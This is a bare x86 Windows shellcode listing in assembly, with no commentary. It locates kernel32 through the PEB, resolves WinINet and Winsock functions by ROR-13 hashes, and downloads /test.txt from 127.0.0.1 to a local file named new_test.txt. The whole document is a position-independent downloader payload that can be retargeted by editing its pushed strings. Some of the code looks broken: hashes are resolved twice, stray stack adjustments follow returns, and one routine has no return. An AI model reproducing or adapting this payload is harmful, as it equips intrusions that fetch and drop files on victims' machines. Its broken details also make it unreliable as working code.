start:
       mov ebp, esp
       sub esp, 0x648
   find_kernel32:                       
       xor ecx,ecx                     
       mov esi,fs:[ecx+30h]            
       mov esi,[esi+0Ch]               
       mov esi,[esi+1Ch]               
   next_module:                         
       mov ebx, [esi+8h]               
       mov edi, [esi+20h]              
       mov esi, [esi]                  
       cmp [edi+12*2], cx              
       jne next_module                 
   find_function_shorten:               
       jmp find_function_shorten_bnc   
   find_function_ret:                   
       pop esi                         
       mov [ebp+0x04], esi             
       jmp resolve_symbols_kernel32    
   find_function_shorten_bnc:           
       call find_function_ret          
   find_function:                       
       pushad                          
       mov eax, [ebx+0x3c]             
       mov edi, [ebx+eax+0x78]         
       add edi, ebx                    
       mov ecx, [edi+0x18]             
       mov eax, [edi+0x20]             
       add eax, ebx                    
       mov [ebp-4], eax                
   find_function_loop:                  
       jecxz find_function_finished    
       dec ecx                         
       mov eax, [ebp-4]                
       mov esi, [eax+ecx*4]            
       add esi, ebx                    
   compute_hash:                        
       xor eax, eax                    
       cdq                             
       cld                             
   compute_hash_again:                  
       lodsb                           
       test al, al                     
       jz compute_hash_finished        
       ror edx, 0x0d                   
       add edx, eax                    
       jmp compute_hash_again          
   compute_hash_finished:               
   find_function_compare:               
       cmp edx, [esp+0x24]             
       jnz find_function_loop          
       mov edx, [edi+0x24]             
       add edx, ebx                    
       mov cx, [edx+2*ecx]             
       mov edx, [edi+0x1c]             
       add edx, ebx                    
       mov eax, [edx+4*ecx]            
       add eax, ebx                    
       mov [esp+0x1c], eax             
   find_function_finished:              
       popad                           
       ret                             
   resolve_symbols_kernel32:            
       push 0x78b5b983
       call dword ptr [ebp+0x04]       
       mov [ebp+0x10], eax             
       push 0xec0e4e8e
       call dword ptr [ebp+0x04]       
       mov [ebp+0x14], eax             
       push 0x0006c
       push 0x6c642e6c
       push 0x6c64746e
       push esp
       call dword ptr [ebp+0x14]
       mov ebx, eax
       push 0x77c93c6
       call dword ptr [ebp+0x04]
       mov [ebp+0x20], eax
       push 0x3e192526
       call dword ptr [ebp+0x04]
       mov [ebp+0x24], eax
       push 0x77c93c6
       call dword ptr [ebp+0x04]
       mov [ebp+0x28], eax
       push 0x3e192526
       call dword ptr [ebp+0x04]
       mov [ebp+0x2c], eax
       push 0x06c6c64
       push 0x2e74656e
       push 0x696e6977
       push esp
       call dword ptr [ebp+0x14]
       mov ebx, eax
       push 0x57e84429
       call dword ptr [ebp+0x04]
       mov [ebp+0x30], eax
       push 0x1e4be80e
       call dword ptr [ebp+0x04]
       mov [ebp+0x34], eax
       push 0xf7de769f
       call dword ptr [ebp+0x04]
       mov [ebp+0x38], eax
       push 0x2de6be9d
       call dword ptr [ebp+0x04]
       mov [ebp+0x3c], eax
       push 0x5fe34b8b
       call dword ptr [ebp+0x04]
       mov [ebp+0x40], eax
       push 0x006c6c
       push 0x642e3233
       push 0x5f327377
       push esp
       call dword ptr [ebp+0x14]
       mov ebx, eax
       push 0x3bfcedcb
       call dword ptr [ebp+0x04]
       mov [ebp+0x44], eax
       push 0xadf509d9
       call dword ptr [ebp+0x04]
       mov [ebp+0x48], eax
       push 0xb32dba0c
       call dword ptr [ebp+0x04]
       mov [ebp+0x4c], eax
       mov esi, ebp
       jmp main
   strlen:
       push ebp
       mov ebp, esp
       sub esp, 0x8
       mov dword ptr [ebp-0x4], 0x0
       mov eax, [ebp+0x8]
       mov ebx, [ebp-0x4]
       add eax, ebx
       mov al, byte ptr[eax]
       movzx eax, al
       mov dword ptr [ebp-0x8], eax
   while_stmt1:
       mov eax, [ebp-0x8]
       cmp eax, 0x0
       jle while_stmt1_end
       mov eax, [ebp-0x4]
       add eax, 1
       mov dword ptr [ebp-0x4], eax
       mov eax, [ebp+0x8]
       mov ebx, [ebp-0x4]
       add eax, ebx
       mov al, byte ptr[eax]
       movzx eax, al
       mov dword ptr [ebp-0x8], eax
       jmp while_stmt1
   while_stmt1_end:
       mov eax, [ebp-0x4]
       mov esp, ebp
       pop ebp
       ret
      add esp, 0x4
   HTTPConnect:
       push ebp
       mov ebp, esp
       sub esp, 0x8
       mov eax, [ebp+0x8]
       push 0x0
       push 0x0
       push 0x0
       push 0x1
       push eax
       call dword ptr [esi+0x30]
       mov dword ptr [ebp-0x4], eax
       mov eax, [ebp-0x4]
       mov ebx, [ebp+0xc]
       push 0x0
       push 0x0
       push 0x3
       push 0x0
       push 0x0
       push 0x50
       push ebx
       push eax
       call dword ptr [esi+0x34]
       mov dword ptr [ebp-0x8], eax
       mov eax, [ebp-0x8]
       mov esp, ebp
       pop ebp
       ret
      add esp, 0x8
   HTTPGetRequest:
       push ebp
       mov ebp, esp
       sub esp, 0xc
       push 0x0544547
       mov [ebp-0x4], esp
       mov eax, [ebp+0x8]
       mov ebx, [ebp-0x4]
       mov ecx, [ebp+0xc]
       push 0x0
       push 0x80000000
       push 0x0
       push 0x0
       push 0x0
       push ecx
       push ebx
       push eax
       call dword ptr [esi+0x38]
       mov dword ptr [ebp-0x8], eax
       mov eax, [ebp+0x10]
       push eax
       call strlen
       mov dword ptr [ebp-0xc], eax
       mov eax, [ebp-0x8]
       mov ebx, [ebp+0x10]
       mov ecx, [ebp-0xc]
       push 0x0
       push 0x0
       push ecx
       push ebx
       push eax
       call dword ptr [esi+0x3c]
       mov eax, [ebp-0x8]
       mov esp, ebp
       pop ebp
       ret
      add esp, 0xc
   HTTPDownloadFile:
       push ebp
       mov ebp, esp
       sub esp, 0x20
       push 0x00072
       push 0x65726f6c
       push 0x70784520
       push 0x74656e72
       push 0x65746e49
       mov [ebp-0x4], esp
       push 0x006d61
       push 0x65727473
       push 0x2d746574
       push 0x636f2f6e
       push 0x6f697461
       push 0x63696c70
       push 0x7061203a
       push 0x65707954
       push 0x2d746e65
       push 0x746e6f43
       mov [ebp-0x8], esp
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       push 0x2
       call dword ptr [esi+0x28]
       mov dword ptr [ebp-0xc], eax
       mov eax, [ebp-0xc]
       mov ebx, [ebp+0x14]
       push ebx
       push 0x8
       push eax
       call dword ptr [esi+0x2c]
       mov dword ptr [ebp-0x10], eax
       mov eax, [ebp-0x4]
       mov ebx, [ebp+0x8]
       push ebx
       push eax
       call HTTPConnect
       mov dword ptr [ebp-0x14], eax
       mov eax, [ebp-0x14]
       mov ebx, [ebp+0xc]
       mov ecx, [ebp-0x8]
       push ecx
       push ebx
       push eax
       call HTTPGetRequest
       mov dword ptr [ebp-0x18], eax
       lea eax, dword ptr [ebp-0x1c]
       mov eax, [ebp-0x18]
       mov ebx, [ebp-0x10]
       mov ecx, [ebp+0x14]
       sub ecx, 1
       mov edx, [ebp-0x20]
       push edx
       push ecx
       push ebx
       push eax
       call dword ptr [esi+0x40]
      add esp, 0x10
   main:
       push ebp
       mov ebp, esp
       sub esp, 0x14
       push 0x00031
       push 0x2e302e30
       push 0x2e373231
       mov [ebp-0x4], esp
       push 0x00074
       push 0x78742e74
       push 0x7365742f
       mov [ebp-0x8], esp
       push 0x0000
       push 0x7478742e
       push 0x74736574
       push 0x5f77656e
       mov [ebp-0xc], esp
       push 0x00072
       push 0x65726f6c
       push 0x70784520
       push 0x74656e72
       push 0x65746e49
       mov [ebp-0x10], esp
       push 0x0006e
       push 0x5c6c6d74
       push 0x682f7478
       push 0x6574203a
       push 0x65707954
       push 0x2d746e65
       push 0x746e6f43
       mov [ebp-0x14], esp
       mov eax, [ebp-0x4]
       mov ebx, [ebp-0x8]
       mov ecx, [ebp-0xc]
       push 0x7d0
       push ecx
       push ebx
       push eax
       call HTTPDownloadFile
       mov eax, 1
       mov esp, ebp
       pop ebp
       ret